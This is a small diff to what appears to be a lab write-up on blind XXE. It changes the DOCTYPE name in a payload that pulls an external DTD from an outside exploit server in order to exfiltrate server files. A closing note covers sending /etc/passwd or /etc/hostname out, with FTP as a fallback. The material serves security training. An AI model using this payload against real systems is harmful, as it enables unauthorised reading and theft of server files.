@@ -50,7 +50,7 @@ Content of exploit.dtd:
 Content of xxe payload:
 
 ```xml
-<!DOCTYPE root [<!ENTITY % xxe SYSTEM "https://exploit-0a4b005404099ed681bfedb501c50098.exploit-server.net/exploit"> %xxe;]>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a4b005404099ed681bfedb501c50098.exploit-server.net/exploit"> %xxe;]>
 ```
 
 ```P.S This technique might not work with some file contents, including the newline characters contained in the /etc/passwd file. This is because some XML parsers fetch the URL in the external entity definition using an API that validates the characters that are allowed to appear within the URL. In this situation, it might be possible to use the FTP protocol instead of HTTP. Sometimes, it will not be possible to exfiltrate data containing newline characters, and so a file such as /etc/hostname can be targeted instead. ```
